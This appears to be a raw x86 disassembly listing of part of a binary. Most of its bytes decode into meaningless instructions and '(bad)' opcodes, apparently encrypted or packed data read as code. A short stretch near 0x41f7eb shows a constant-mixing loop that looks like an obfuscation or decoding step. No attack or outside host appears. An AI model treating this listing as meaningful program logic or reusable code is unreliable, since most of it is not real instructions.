  41f43c:	in     eax,0xd8
  41f43e:	(bad)  
  41f43f:	cmc    
  41f440:	add    al,0xe4
  41f442:	add    al,0xcf
  41f444:	fldln2 
  41f446:	out    0xdd,eax
  41f448:	lock jmp 0xcbd4:0xaeabe9cc
  41f450:	repnz mov cl,0xd9
  41f453:	int    0xfd
  41f455:	fcomp  st(1)
  41f457:	inc    BYTE PTR [ebx]
  41f459:	inc    BYTE PTR [ecx]
  41f45b:	add    bh,ah
  41f45d:	(bad)  
  41f45f:	cli    
  41f460:	add    eax,0xdaed0500
  41f465:	fild   WORD PTR ds:0xe1d3dc11
  41f46b:	mov    bl,0xab
  41f46d:	repz jmp 0xf815c128
  41f473:	(bad)
  41f476:	xlat   BYTE PTR ds:[ebx]
  41f477:	in     eax,dx
  41f478:	imul   al
  41f47a:	aad    0xff
  41f47c:	add    edi,esi
  41f47e:	retf   
  41f47f:	fiadd  DWORD PTR [ecx]
  41f481:	leave  
  41f482:	shr    esi,0x1
  41f485:	enter  0xc0e0,0xe5
  41f489:	rcl    cl,cl
  41f48b:	int3   
  41f48c:	jmp    0x41f44e
  41f48e:	out    0xf6,eax
  41f490:	shr    bl,cl
  41f492:	shl    al,cl
  41f494:	mov    esi,0xfbc2ebfd
  41f499:	sar    BYTE PTR [ecx-0x2b25fc30],0xf7
  41f4a0:	retf   
  41f4a1:	or     al,bl
  41f4a3:	or     eax,0xfae4d9c7
  41f4a8:	rcl    edi,1
  41f4aa:	jmp    0xf3f1:0xb7d7e1c4
  41f4b1:	imul   ah
  41f4b3:	mov    al,0xcf
  41f4b5:	mov    ecx,0xd1cfdfe9
  41f4ba:	(bad)  
  41f4bb:	(bad)  
  41f4bd:	repz mov ecx,0xefcac0bc
  41f4c3:	mov    BYTE PTR [ecx],0xf4
  41f4c6:	loop   0x41f4da
  41f4c8:	in     eax,dx
  41f4c9:	retf   
  41f4ca:	iret   
  41f4cb:	shl    edx,0xb1
  41f4ce:	mov    ah,0xeb
  41f4d0:	not    edi
  41f4d2:	out    dx,al
  41f4d3:	in     eax,0xd7
  41f4d5:	aad    0xb4
  41f4d7:	mov    eax,0xdec3ffd6
  41f4dc:	(bad)  
  41f4de:	add    dh,ch
  41f4e0:	jmp    0xec06:0x906c4c9
  41f4e7:	(bad)  
  41f4e8:	call   0xbe2da2c0
  41f4ed:	(bad)  
  41f4ee:	mov    dh,0xc9
  41f4f0:	out    dx,al
  41f4f1:	sar    bh,0xfb
  41f4f4:	mov    esi,0xd7cdccdb
  41f4f9:	mov    dh,0xbf
  41f4fb:	mov    esp,0xab9d9ed
  41f500:	retf   0xc0ef
  41f503:	(bad)  
  41f504:	in     eax,0xc9
  41f506:	into   
  41f507:	(bad)  
  41f508:	stos   BYTE PTR es:[edi],al
  41f509:	in     al,dx
  41f50a:	loopne 0x41f4f6
  41f50c:	in     eax,dx
  41f50d:	mov    esp,0xfff4eed1
  41f512:	into   
  41f513:	int    0xe8
  41f515:	fdivr  st,st(1)
  41f517:	shl    edx,cl
  41f519:	idiv   DWORD PTR [edi-0x42271b4c]
  41f51f:	imul   eax
  41f521:	(bad)  
  41f522:	jmp    0xcf0a:0x13c402bc
  41f529:	mov    cl,0xeb
  41f52b:	in     eax,dx
  41f52c:	mov    bl,0xae
  41f52e:	(bad)  
  41f52f:	mov    cl,0xcf
  41f531:	in     al,0xcd
  41f533:	aad    0xd2
  41f535:	into   
  41f536:	sti    
  41f537:	fnstsw ax
  41f539:	loop   0x41f52f
  41f53b:	cld    
  41f53c:	neg    bh
  41f53e:	imul   dl
  41f540:	cld    
  41f541:	fiadd  WORD PTR [esi]
  41f543:	add    eax,0xfac8d807
  41f548:	jmp    0xb737e314
  41f54d:	hlt    
  41f54e:	lods   eax,DWORD PTR ds:[esi]
  41f54f:	mov    bl,0xdb
  41f551:	mov    ecx,0xf4ebf5cf
  41f556:	mov    ah,0xd4
  41f558:	idiv   DWORD PTR [edi+edi*4-0xe0df834]
  41f55f:	stc    
  41f560:	retf   0xe8e5
  41f563:	add    cl,bh
  41f565:	loope  0x41f56a
  41f567:	in     al,0xb9
  41f569:	enter  0xb0c4,0xc6
  41f56d:	loope  0x41f546
  41f56f:	aam    0xda
  41f571:	stc    
  41f572:	(bad)  
  41f573:	cmc    
  41f574:	retf   
  41f575:	(bad)  
  41f576:	loop   0x41f531
  41f578:	mov    ecx,0xf3dfd9bf
  41f57d:	in     al,dx
  41f57e:	lock loope 0x41f57b
  41f581:	fsubrp st(5),st
  41f583:	out    dx,al
  41f584:	push   cs
  41f585:	fld    DWORD PTR [ecx]
  41f587:	stc    
  41f588:	lods   al,BYTE PTR ds:[esi]
  41f589:	call   0xc0f3dc4e
  41f58e:	loope  0x41f569
  41f590:	in     al,0xfa
  41f592:	in     al,0xed
  41f594:	(bad)  
  41f596:	iret   
  41f597:	fnstsw WORD PTR [edi-0x272a382b]
  41f59d:	push   es
  41f59e:	idiv   DWORD PTR [eax-0x3a3e3f18]
  41f5a4:	in     eax,0xc
  41f5a6:	jmp    0x41f580
  41f5a8:	jecxz  0x41f553
  41f5aa:	jmp    0xd9b0:0xe4b0e0ad
  41f5b1:	ffreep st(5)
  41f5b3:	std    
  41f5b4:	jmp    0x601:0xeff5ccd8
  41f5bb:	into   
  41f5bc:	cmc    
  41f5bd:	rol    DWORD PTR [edi+eiz*8],cl
  41f5c0:	(bad)  
  41f5c2:	cld    
  41f5c3:	loopne 0x41f5af
  41f5c5:	adc    esp,ebp
  41f5c7:	pop    es
  41f5c8:	mov    esp,0xd3ccbcde
  41f5cd:	rol    ch,1
  41f5cf:	retf   0xbaef
  41f5d2:	(bad)  
  41f5d3:	jmp    0xf332b0c4
  41f5d8:	into   
  41f5d9:	clc    
  41f5da:	int    0xfe
  41f5dc:	mov    esi,0xdec3e0fa
  41f5e1:	(bad)  
  41f5e2:	loop   0x41f5ac
  41f5e4:	add    esi,ebx
  41f5e6:	cli    
  41f5e7:	out    0xc7,eax
  41f5e9:	int3   
  41f5ea:	jmp    0xf124ede0
  41f5ef:	(bad)
  41f5f2:	(bad)  
  41f5f3:	sti    
  41f5f4:	in     eax,0xd9
  41f5f6:	mov    ah,0xdd
  41f5f8:	clc    
  41f5f9:	call   0xd61eaabc
  41f5fe:	ret    0xc704
  41f601:	retf   
  41f602:	std    
  41f603:	(bad)  
  41f604:	sti    
  41f605:	or     edi,ebx
  41f607:	loope  0x41f5b5
  41f609:	ffree  st(2)
  41f60b:	aad    0xb5
  41f60d:	imul   al
  41f60f:	into   
  41f610:	jmp    0xca10f4cb
  41f615:	push   DWORD PTR [ebp-0xe104828]
  41f61b:	out    0xf0,eax
  41f61d:	(bad)
  41f620:	xlat   BYTE PTR ds:[ebx]
  41f621:	add    ebp,edi
  41f623:	std    
  41f624:	aam    0xdd
  41f626:	fucom  st(3)
  41f628:	mov    edi,0xd3c6c3bc
  41f62d:	loope  0x41f613
  41f62f:	(bad)  
  41f630:	test   dh,0xb9
  41f633:	int    0xe5
  41f635:	mov    ecx,0xe2bcf7f7
  41f63a:	mov    ecx,0xd2d7f8ed
  41f63f:	ffree  st(6)
  41f641:	loop   0x41f637
  41f643:	test   dl,0xce
  41f646:	(bad)  
  41f647:	jmp    0xcb09af12
  41f64c:	div    bl
  41f64e:	leave  
  41f64f:	mov    dl,0xeb
  41f651:	lock ror eax,cl
  41f654:	mov    ecx,0xc8f502cb
  41f659:	in     al,dx
  41f65a:	fdiv   st(0),st
  41f65c:	std    
  41f65d:	(bad)  
  41f65e:	jmp    0x41f63b
  41f660:	(bad)  
  41f662:	leave  
  41f663:	(bad)  
  41f665:	or     eax,0xc0e2f9fe
  41f66a:	loopne 0x41f65b
  41f66c:	stos   DWORD PTR es:[edi],eax
  41f66d:	iret   
  41f66e:	retf   0xd0a8
  41f671:	icebp  
  41f672:	enter  0xb9f7,0xb2
  41f676:	add    edi,esp
  41f678:	std    
  41f679:	loope  0x41f657
  41f67b:	fadd   st,st(0)
  41f67d:	aam    0xd2
  41f67f:	add    eax,0xf6070f06
  41f684:	loopne 0x41f661
  41f686:	out    dx,eax
  41f687:	fmul   st(3),st
  41f689:	ror    cl,1
  41f68b:	mov    cl,0xae
  41f68d:	shr    BYTE PTR [ebp-0x112e1158],0xb8
  41f694:	mov    esi,0xd2eccaec
  41f699:	call   0xd21cb66f
  41f69e:	add    BYTE PTR [esi],al
  41f6a0:	test   BYTE PTR [edi],0xfd
  41f6a3:	or     ebp,edi
  41f6a5:	repz jecxz 0x41f68e
  41f6a8:	jmp    0xbbe8:0xb2f7e9c1
  41f6af:	enter  0xf5cd,0xb9
  41f6b3:	mov    edx,0xccbfcaf4
  41f6b8:	sti    
  41f6b9:	repnz (bad) 
  41f6bb:	in     eax,dx
  41f6bc:	add    DWORD PTR [ecx],eax
  41f6be:	push   es
  41f6bf:	shl    dl,cl
  41f6c1:	cli    
  41f6c2:	push   es
  41f6c3:	(bad)  
  41f6c5:	in     al,0xf
  41f6c7:	int3   
  41f6c8:	repnz test eax,0xedcdb0f3
  41f6ce:	retf   0xd7ee
  41f6d1:	repz (bad) 
  41f6d5:	mov    esi,0xf9ece9de
  41f6da:	rcl    ebp,cl
  41f6dc:	fstp   st(7)
  41f6de:	rcl    ch,0xd4
  41f6e1:	out    0xf4,al
  41f6e3:	aam    0xd8
  41f6e5:	(bad)  
  41f6e6:	cli    
  41f6e7:	(bad)  
  41f6e9:	mov    esi,0xe7dde1cd
  41f6ee:	rcl    dh,1
  41f6f0:	repnz mov eax,0xf0d3dbad
  41f6f6:	out    dx,eax
  41f6f7:	hlt    
  41f6f8:	add    bh,ch
  41f6fa:	(bad)  
  41f6fc:	(bad)  
  41f6fe:	loope  0x41f6fe
  41f700:	sar    ebp,0xf5
  41f703:	enter  0xe9c9,0x6
  41f707:	in     eax,0xe2
  41f709:	ret    
  41f70a:	mov    ebp,0xe1c6d6b0
  41f70f:	loopne 0x41f6e4
  41f711:	clc    
  41f712:	fcom   st(7)
  41f714:	jmp    0xedf5:0xccecbc03
  41f71b:	into   
  41f71c:	loope  0x41f6f2
  41f71e:	add    esi,ebx
  41f720:	aam    0xc8
  41f722:	clc    
  41f723:	pop    es
  41f724:	or     al,0x1
  41f726:	in     al,0x5
  41f728:	ret    
  41f729:	int    0xce
  41f72b:	test   al,0xea
  41f72d:	into   
  41f72e:	mov    dl,0xe5
  41f730:	mov    dh,0xc6
  41f732:	idiv   bl
  41f734:	std    
  41f735:	fcmovu st,st(7)
  41f737:	(bad)  
  41f738:	mov    eax,0xffc2f6e2
  41f73d:	ret    0xdde5
  41f740:	add    ebx,edi
  41f742:	(bad)  [eax]
  41f744:	fxch   st(3)
  41f746:	clc    
  41f747:	out    0xd3,al
  41f749:	out    0xd0,eax
  41f74b:	test   cl,0xb2
  41f74e:	lock ret 0xc6af
  41f752:	fucomi st,st(5)
  41f754:	mov    edx,0xefd1b9fe
  41f759:	mov    esi,0xd5e4b8f0
  41f75e:	sti    
  41f75f:	stc    
  41f760:	(bad)  
  41f761:	jecxz  0x41f72b
  41f763:	in     al,0xf4
  41f765:	or     dl,ch
  41f767:	or     al,0xaa
  41f769:	(bad)
  41f76c:	in     eax,0xf7
  41f76e:	call   0xd80dd141
  41f773:	lock shl bl,cl
  41f776:	aam    0xff
  41f778:	enter  0xefc8,0x0
  41f77c:	fdivrp st(6),st
  41f77e:	or     edi,edx
  41f780:	aad    0xc7
  41f782:	push   es
  41f783:	fadd   QWORD PTR [esi]
  41f785:	dec    BYTE PTR [ebx]
  41f787:	loope  0x41f762
  41f789:	mov    eax,0xb2b1d1c3
  41f78e:	cli    
  41f78f:	mov    bl,0xe8
  41f791:	fcmovnbe st,st(5)
  41f793:	les    edi,FWORD PTR [eax-0x3120c32]
  41f799:	loope  0x41f762
  41f79b:	in     al,dx
  41f79c:	rcr    cl,cl
  41f79e:	hlt    
  41f79f:	neg    ah
  41f7a1:	fsubr  st,st(3)
  41f7a3:	aam    0xef
  41f7a5:	loope  0x41f794
  41f7a7:	repz mov eax,0xc1f6a9b2
  41f7ad:	jmp    0xe107eea3
  41f7b2:	shl    ebx,1
  41f7b4:	repz jecxz 0x41f7b3
  41f7b7:	(bad)  
  41f7b8:	loop   0x41f796
  41f7ba:	mov    eax,0xfbc701d0
  41f7bf:	in     al,0xe0
  41f7c1:	leave  
  41f7c2:	call   0xf33abfa0
  41f7c7:	cld    
  41f7c8:	in     eax,0xd0
  41f7ca:	out    dx,al
  41f7cb:	fmul   st(5),st
  41f7cd:	(bad)
  41f7d0:	mov    edx,0xecf9e7b6
  41f7d5:	std    
  41f7d6:	shr    cl,cl
  41f7d8:	add    bh,dh
  41f7da:	(bad)  
  41f7db:	fsubrp st(7),st
  41f7dd:	int3   
  41f7de:	(bad)
  41f7e1:	fabs   
  41f7e3:	fmul   DWORD PTR ds:0x2427830f
  41f7e9:	add    BYTE PTR [eax],al
  41f7eb:	mov    eax,DWORD PTR [ebp-0x138]
  41f7f1:	sub    eax,0x3272fb
  41f7f6:	xor    eax,0x75108b5
  41f7fb:	add    eax,0x7f55d8f2
  41f800:	mov    ecx,DWORD PTR [ebp-0x138]
  41f806:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  41f80d:	mov    eax,DWORD PTR [ebp-0x138]
  41f813:	cmp    DWORD PTR [ebp+eax*4-0x130],0x244ecb9d
  41f81e:	jbe    0x421bee
  41f824:	jmp    0x421bca
  41f829:	retf   0x3386
  41f82c:	sub    esi,DWORD PTR [edi+0x2e]
  41f82f:	shl    BYTE PTR [esi+0x7c],cl
  41f832:	inc    esi
  41f834:	jnp    0x41f8af
  41f836:	push   ebp
  41f837:	add    eax,0x7a23d657
  41f83c:	jnp    0x41f840
  41f83e:	cwde   
  41f83f:	jnp    0x41f8bc
  41f841:	add    dl,bl
  41f843:	out    dx,al
  41f844:	out    dx,al
  41f845:	fsubp  st(3),st
  41f847:	les    ebp,FWORD PTR [esi-0x6054c2f]
  41f84d:	call   0xd22fd13c
  41f852:	in     eax,dx
  41f853:	repz into 
  41f855:	loope  0x41f82f
  41f857:	mov    ah,0xdd
  41f859:	hlt    
  41f85a:	in     al,0xdf
  41f85c:	aad    0xf6
  41f85e:	lds    eax,FWORD PTR [eax]
  41f860:	add    cl,BYTE PTR [edi]
  41f862:	repnz int 0xd9
  41f865:	stos   BYTE PTR es:[edi],al
  41f866:	in     al,0xd0
  41f868:	cmc    
  41f869:	fadd   st(4),st
  41f86b:	out    0xf1,al
  41f86d:	aam    0xad
  41f86f:	retf   
  41f870:	iret   
  41f871:	mov    ebx,0xbcbbc3d9
  41f876:	mov    esp,0xfdd6ecbd
  41f87b:	not    ch
  41f87d:	rcr    dh,0xff
  41f880:	(bad)  
  41f882:	jecxz  0x41f87d
  41f884:	int    0xae
  41f886:	into   
  41f887:	ret    
  41f888:	(bad)  
  41f889:	mov    cl,0xd6
  41f88b:	hlt    
  41f88c:	int3   
  41f88d:	rol    bh,0xf7
  41f890:	in     al,dx
  41f891:	stc    
  41f892:	shl    ebp,1
  41f894:	loope  0x41f869
  41f896:	test   eax,0x3f0ebfb
  41f89c:	retf   
  41f89d:	leave  
  41f89e:	imul   ebx
  41f8a0:	fmul   st(4),st
  41f8a2:	repz enter 0xddf2,0xdf
  41f8a7:	in     eax,0xd2
  41f8a9:	out    0xe3,eax
  41f8ab:	into   
  41f8ac:	(bad)
  41f8af:	repz mov ebp,0xf4c2f2b5
  41f8b5:	pop    es
  41f8b6:	in     eax,dx
  41f8b7:	aad    0xdb
  41f8b9:	std    
  41f8ba:	(bad)  
  41f8bb:	icebp  
  41f8bc:	retf   0xe1e9
  41f8bf:	fadd   st(6),st
  41f8c1:	stc    
  41f8c2:	into   
  41f8c3:	adc    eax,eax
  41f8c5:	lods   al,BYTE PTR ds:[esi]
  41f8c6:	(bad)  
  41f8c7:	shl    al,cl
  41f8c9:	ret    0xf9b4
  41f8cc:	call   0xda20c7ca
  41f8d1:	(bad)  
  41f8d3:	enter  0xe0ef,0xd5
  41f8d7:	in     eax,dx
  41f8d8:	jecxz  0x41f8a6
  41f8da:	xlat   BYTE PTR ds:[ebx]
  41f8db:	lds    eax,FWORD PTR [edx]
  41f8dd:	jmp    0xe205:0xeac600e6
  41f8e4:	ror    edx,0xe0
  41f8e7:	call   0xfafdeddc
  41f8ec:	les    esi,FWORD PTR [ecx-0xf400147]
  41f8f2:	mov    ebx,0xbc01dcf9
  41f8f7:	ffreep st(3)
  41f8f9:	repnz pop es
  41f8fb:	sti    
  41f8fc:	add    al,0xc8
  41f8fe:	out    dx,eax
  41f8ff:	(bad)  
  41f901:	out    0xd8,al
  41f903:	or     al,0xd0
  41f905:	repnz fst st(5)
  41f908:	shl    DWORD PTR [ebx+ebp*8-0x133142d],1
  41f90f:	jmp    0xdc2ecece
  41f914:	mov    ecx,0xf603e0f1
  41f919:	rcl    ebp,1
  41f91b:	(bad)  
  41f91d:	aad    0xf7
  41f91f:	(bad)  
  41f920:	jmp    0xc8e2:0xd1c401cb
  41f927:	jmp    0x41f8da
  41f929:	rcl    al,0xeb
  41f92c:	rcl    edi,cl
  41f92e:	cmc    
  41f92f:	in     al,dx
  41f930:	mov    esi,0xe8f7efd7
  41f935:	aad    0xfa
  41f937:	rcl    ch,1
  41f939:	rcr    eax,cl
  41f93b:	fadd   QWORD PTR [esi]
  41f93d:	aam    0xe9
  41f93f:	out    dx,al
  41f940:	fiadd  WORD PTR [edi]
  41f942:	fild   DWORD PTR ds:0xc6dccbec
  41f948:	in     eax,0xbc
  41f94a:	jmp    0xd03bba1b
  41f94f:	leave  
  41f950:	shr    edx,1
  41f952:	mov    ah,0xf9
  41f954:	shl    eax,cl
  41f956:	icebp  
  41f957:	clc    
  41f958:	sti    
  41f959:	out    0xe3,al
  41f95b:	add    al,0xfa
  41f95d:	loopne 0x41f959
  41f95f:	mov    esp,0xe9ebc2c3
  41f964:	out    0xac,al
  41f966:	scas   eax,DWORD PTR es:[edi]
  41f967:	bnd ret 0xe1e9
  41f96b:	shl    cl,0xb4
  41f96e:	iret   
  41f96f:	(bad)  
  41f970:	mov    ebp,0xe303cecc
  41f975:	(bad)  
  41f976:	add    edi,edi
  41f978:	loopne 0x41f94d
  41f97a:	mov    ebp,0xcaf6c4d0
  41f97f:	(bad)  
  41f980:	jmp    0x41f947
  41f982:	iret   
  41f983:	or     eax,0xeaedeae4
  41f988:	mov    dl,0xd6
  41f98a:	shl    BYTE PTR [edx-0x53152438],1
  41f990:	fnsave [edx-0x28114146]
  41f996:	sar    DWORD PTR [esp+eax*1-0x291a1a07],cl
  41f99d:	xlat   BYTE PTR ds:[ebx]
  41f99e:	fucomip st,st(3)
  41f9a0:	std    
  41f9a1:	sti    
  41f9a2:	jmp    0xe011eda0
  41f9a7:	jmp    0x41f960
  41f9a9:	shl    dh,1
  41f9ab:	enter  0xdbf3,0xfb
  41f9af:	mov    ch,0xd9
  41f9b1:	call   esi
  41f9b3:	fadd   st(3),st
  41f9b5:	rol    bh,1
  41f9b7:	loope  0x41f999
  41f9b9:	idiv   BYTE PTR [ecx-0x1b200f04]
  41f9bf:	dec    esi
  41f9c1:	or     bh,bl
  41f9c3:	in     al,0xbe
  41f9c5:	ret    
  41f9c6:	rol    ebp,0xd2
  41f9c9:	lods   al,BYTE PTR ds:[esi]
  41f9ca:	lods   eax,DWORD PTR ds:[esi]
  41f9cb:	jmp    0xe4cc:0xb4f3ecd2
  41f9d2:	fdiv   st,st(0)
  41f9d4:	leave  
  41f9d5:	enter  0xc7cc,0xbe
  41f9d9:	loopne 0x41f9d4
  41f9db:	or     al,ah
  41f9dd:	add    BYTE PTR [ecx],al
  41f9df:	retf   0xefc3
  41f9e2:	out    dx,eax
  41f9e3:	iret   
  41f9e4:	lock repz icebp 
  41f9e7:	test   eax,0xc1fbccd4
  41f9ed:	in     al,dx
  41f9ee:	aam    0xb6
  41f9f0:	retf   
  41f9f1:	out    dx,al
  41f9f2:	fdiv   st,st(0)
  41f9f4:	leave  
  41f9f5:	lock add eax,ecx
  41f9f8:	aam    0xfd
  41f9fa:	(bad)
  41f9fd:	out    0xa,eax
  41f9ff:	push   cs
  41fa00:	add    al,0xdf
  41fa02:	cld    
  41fa03:	in     al,dx
  41fa04:	(bad)  
  41fa05:	fild   QWORD PTR [ecx-0x1b38371b]
  41fa0b:	cli    
  41fa0c:	loope  0x41f9e1
  41fa0e:	repz in eax,0xd5
  41fa11:	std    
  41fa12:	mov    ebx,0xdfe1b7bf
  41fa17:	inc    DWORD PTR [eax]
  41fa19:	out    0xf4,al
  41fa1b:	out    0xcb,eax
  41fa1d:	jmp    0x41f9f6
  41fa1f:	iret   
  41fa20:	movntq (bad),mm1
  41fa21:	out    0xca,eax
  41fa23:	call   0xd601ba00
  41fa28:	retf   
  41fa29:	(bad)
  41fa2c:	cli    
  41fa2d:	out    0xad,eax
  41fa2f:	in     al,dx
  41fa30:	idiv   bh
  41fa32:	cmc    
  41fa33:	shl    dl,1
  41fa35:	enter  0xe2f9,0x5
  41fa39:	(bad)  
  41fa3a:	cmc    
  41fa3b:	(bad)
  41fa3e:	push   es
  41fa3f:	add    al,0x4
  41fa41:	fmul   QWORD PTR [edx]
  41fa43:	push   es
  41fa44:	out    0xc2,al
  41fa46:	out    dx,al
  41fa47:	in     al,dx
  41fa48:	lods   al,BYTE PTR ds:[esi]
  41fa49:	fsub   st(4),st
  41fa4b:	shr    DWORD PTR [edi-0x9190921],1
  41fa51:	div    BYTE PTR [ecx-0x2cfe3713]
  41fa57:	clc    
  41fa58:	in     eax,dx
  41fa59:	jecxz  0x41fa53
  41fa5b:	cmc    
  41fa5c:	(bad)  
  41fa5d:	test   bh,0xdd
  41fa60:	or     al,0xd8
  41fa62:	or     al,ah
  41fa64:	retf   
  41fa65:	in     al,dx
  41fa66:	mov    esi,0xe1e3ada4
  41fa6b:	rcr    eax,0xeb
  41fa6e:	jmp    0xb921b06c
  41fa73:	sar    edi,1
  41fa75:	rol    BYTE PTR [esi],0x1
  41fa78:	add    ebx,ecx
  41fa7a:	faddp  st(5),st
  41fa7c:	cmc    
  41fa7d:	(bad)  
  41fa7f:	add    eax,0xe208f409
  41fa84:	scas   eax,DWORD PTR es:[edi]
  41fa85:	repz loopne 0x41fa5a
  41fa88:	call   0xd017cd42
  41fa8d:	repnz aam 0xb6
  41fa90:	out    dx,eax
  41fa91:	mov    ebp,0xf1bfc2ce
  41fa96:	repz push es
  41fa98:	add    eax,0xc7f8f4f2
  41fa9d:	cmc    
  41fa9e:	fcmovnu st,st(3)
  41faa0:	out    0xed,eax
  41faa2:	int    0xda
  41faa4:	scas   eax,DWORD PTR es:[edi]
  41faa5:	lods   al,BYTE PTR ds:[esi]
  41faa6:	int    0xf1
  41faa8:	repnz out 0xb2,al
  41faab:	(bad)  
  41faac:	cmc    
  41faad:	shl    eax,1
  41faaf:	fcmovu st,st(3)
  41fab1:	hlt    
  41fab2:	lock iret 
  41fab4:	ret    
  41fab5:	ret    
  41fab6:	fdivr  DWORD PTR [eax+edx*8-0x7193b01]
  41fabd:	or     al,BYTE PTR [ecx]
  41fabf:	retf   0xc8e0
  41fac2:	adc    ch,ah
  41fac4:	retf   0xbee8
  41fac7:	jmp    0xebc5:0xbab3b0ed
  41face:	mov    ah,0xea
  41fad0:	mov    edi,0xfdb4fdfc
  41fad5:	in     al,dx
  41fad6:	mov    ebp,0xc1e1c5e1
  41fadb:	fld    st(2)
  41fadd:	(bad)
  41fae0:	bswap  edx
  41fae2:	dec    ah
  41fae4:	(bad)  
  41fae5:	fnsave [ecx-0x9491911]
  41faeb:	les    esi,FWORD PTR [ecx-0x4437273b]
  41faf1:	icebp  
  41faf2:	enter  0xcfca,0xc3
  41faf6:	mov    edi,0xf5bdc2e6
  41fafb:	jmp    0xdff8:0xadadcdb
  41fb02:	loopne 0x41fae9
  41fb04:	jmp    0xe3e7:0xace4d7e0
  41fb0b:	out    dx,eax
  41fb0c:	leave  
  41fb0d:	mov    dl,0xf7
  41fb0f:	cmc    
  41fb10:	shl    BYTE PTR [edx-0x3f2c0543],1
  41fb16:	into   
  41fb17:	fmulp  st(4),st
  41fb19:	clc    
  41fb1a:	hlt    
  41fb1b:	cld    
  41fb1c:	jmp    0x820c319
  41fb21:	or     BYTE PTR [edx],cl
  41fb23:	int3   
  41fb24:	rol    ebx,0xd2
  41fb27:	(bad)  
  41fb29:	(bad)  
  41fb2a:	in     eax,dx
  41fb2b:	mov    dl,0xe6
  41fb2d:	in     al,0xba
  41fb2f:	call   0xf7f6d20c
  41fb34:	fld    QWORD PTR [eax]
  41fb36:	xlat   BYTE PTR ds:[ebx]
  41fb37:	in     eax,dx
  41fb38:	shl    ch,0xb
  41fb3b:	cli    
  41fb3c:	xlat   BYTE PTR ds:[ebx]
  41fb3d:	std    
  41fb3e:	fiadd  DWORD PTR ds:0xdecfd9e8
  41fb44:	repz int 0xa8
  41fb47:	lods   eax,DWORD PTR ds:[esi]
  41fb48:	(bad)  
  41fb49:	mov    ch,0xd6
  41fb4b:	loop   0x41fb47
  41fb4d:	scas   al,BYTE PTR es:[edi]
  41fb4e:	(bad)  
  41fb4f:	mov    ecx,0xbad9d9d0
  41fb54:	add    cl,dl
  41fb56:	(bad)  
  41fb57:	fnop   
  41fb59:	shl    ebp,cl
  41fb5b:	loop   0x41fb3f
  41fb5d:	(bad)  
  41fb5e:	test   BYTE PTR [edx],0xd4
  41fb61:	aam    0xf
  41fb63:	fisubr DWORD PTR [ebp-0x181c1928]
  41fb69:	out    0xb0,al
  41fb6b:	shl    ebp,1
  41fb6d:	jmp    0xbb01b442
  41fb72:	mov    esp,0xccecbcf7
  41fb77:	into   
  41fb78:	inc    bh
  41fb7a:	sar    bh,1
  41fb7c:	xlat   BYTE PTR ds:[ebx]
  41fb7d:	out    0xfb,eax
  41fb7f:	(bad)  
  41fb80:	in     al,0xe3
  41fb82:	jmp    0x41fb4e
  41fb84:	lds    edi,FWORD PTR [esi-0x4c100a14]
  41fb8a:	in     al,dx
  41fb8b:	out    dx,eax
  41fb8c:	loopne 0x41fb5c
  41fb8e:	fcmovne st,st(7)
  41fb90:	hlt    
  41fb91:	mov    esp,0xd2d4d4db
  41fb96:	repz rcl esi,cl
  41fb99:	out    0xf3,al
  41fb9b:	fadd   st,st(7)
  41fb9d:	lock enter 0xe0fa,0x13
  41fba2:	add    esi,ebx
  41fba4:	in     al,0xc0
  41fba6:	call   0xcff6bf6d
  41fbab:	mov    dl,0xea
  41fbad:	out    0xb5,eax
  41fbaf:	retf   0xf8fd
  41fbb2:	sti    
  41fbb3:	aad    0xcf
  41fbb5:	int3   
  41fbb6:	not    edi
  41fbb8:	mov    esp,0xd50bd9de
  41fbbd:	lock push es
  41fbbf:	loope  0x41fb8a
  41fbc1:	fyl2xp1 
  41fbc3:	or     ch,ch
  41fbc5:	in     eax,0xb1
  41fbc7:	(bad)  
  41fbc9:	jmp    0xc5df:0xf5cab3fb
  41fbd0:	shr    dh,cl
  41fbd2:	(bad)  
  41fbd3:	clc    
  41fbd4:	clc    
  41fbd5:	ret    
  41fbd6:	(bad)  
  41fbd7:	sti    
  41fbd8:	loope  0x41fbd6
  41fbda:	add    al,0xc2
  41fbdc:	aad    0xc2
  41fbde:	retf   0x8cb
  41fbe1:	out    0x3,eax
  41fbe3:	adc    ebx,ebp
  41fbe5:	int    0xaf
  41fbe7:	cmc    
  41fbe8:	call   0xd222e0d5
  41fbed:	ror    ecx,1
  41fbef:	cmc    
  41fbf0:	clc    
  41fbf1:	mov    esp,0xf3fdeeff
  41fbf6:	icebp  
  41fbf7:	repnz add dh,dh
  41fbfa:	(bad)  
  41fbfb:	or     ebx,esp
  41fbfd:	fcmove st,st(0)
  41fbff:	(bad)  
  41fc00:	out    dx,al
  41fc01:	in     al,0x8
  41fc03:	out    dx,al
  41fc04:	out    dx,eax
  41fc05:	out    dx,eax
  41fc06:	int3   
  41fc07:	scas   al,BYTE PTR es:[edi]
  41fc08:	mov    cl,0xb1
  41fc0a:	aam    0xe8
  41fc0c:	scas   eax,DWORD PTR es:[edi]
  41fc0d:	mov    ch,0xef
  41fc0f:	sar    BYTE PTR [eax+0xbbd6bb],1
  41fc15:	fcmovb st,st(2)
  41fc17:	in     al,dx
  41fc18:	jecxz  0x41fc0f
  41fc1a:	rcl    esi,0xde
  41fc1d:	mov    esi,0x4fabcf5
  41fc22:	leave  
  41fc23:	repnz mov edi,0xf1c9dcee
  41fc29:	int    0xc3
  41fc2b:	enter  0xb1d6,0xec
  41fc2f:	(bad)  
  41fc31:	icebp  
  41fc32:	mov    cl,0xe9
  41fc34:	clc    
  41fc35:	mov    dh,0xee
  41fc37:	fcomp  st(1)
  41fc39:	clc    
  41fc3a:	loopne 0x41fc02
  41fc3c:	shl    dh,1
  41fc3e:	or     DWORD PTR [edx],ecx
  41fc40:	mov    ebp,0xc2f2cfe5
  41fc46:	int    0xb0
  41fc48:	jecxz  0x41fc06
  41fc4a:	sti    
  41fc4b:	cli    
  41fc4c:	neg    bl
  41fc4e:	sar    DWORD PTR [edx-0x1600300e],1
  41fc54:	repz jecxz 0x41fc29
  41fc57:	loope  0x41fc5c
  41fc59:	loopne 0x41fc59
  41fc5b:	not    edi
  41fc5d:	sar    ch,1
  41fc5f:	iret   
  41fc60:	loop   0x41fc3d
  41fc62:	repz add eax,0xcae2d7ab
  41fc68:	repz mov esp,0xc4d5e4b3
  41fc6e:	mov    eax,0xddd0b7d8
  41fc73:	mov    ebx,0xbc07d5f4
  41fc78:	loop   0x41fc71
  41fc7a:	clc    
  41fc7b:	faddp  st(3),st
  41fc7d:	enter  0xbc03,0xec
  41fc81:	in     al,dx
  41fc82:	fcom   QWORD PTR [ecx]
